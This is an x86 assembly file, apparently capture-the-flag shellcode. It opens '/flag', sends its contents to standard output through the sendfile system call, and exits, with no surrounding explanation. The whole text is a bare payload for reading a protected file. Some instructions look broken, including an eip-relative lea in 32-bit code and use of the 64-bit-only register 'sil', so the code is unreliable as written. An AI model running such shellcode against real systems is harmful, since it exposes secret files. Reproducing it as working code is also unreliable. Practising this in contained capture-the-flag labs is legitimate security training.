.intel_syntax noprefix
.globl _start

.section .text
_start:

    OPEN_FILE:
        xor eax, eax
        mov al, 5
        lea ebx, [eip + flag_file]
        xor ecx, ecx
        int 0x80

    # Store the fd returned by open().
    xor edx, edx
    mov edx, eax

    SEND_FILE:
        xor eax, eax
        mov al, 187
        xor ebx, ebx
        inc ebx
        mov ecx, edx
        xor edx, edx
        mov sil, 64
        int 0x80

    EXIT:
        xor eax, eax
        inc eax
        xor ebx, ebx
        int 0x80

    flag_file: .string "/flag"
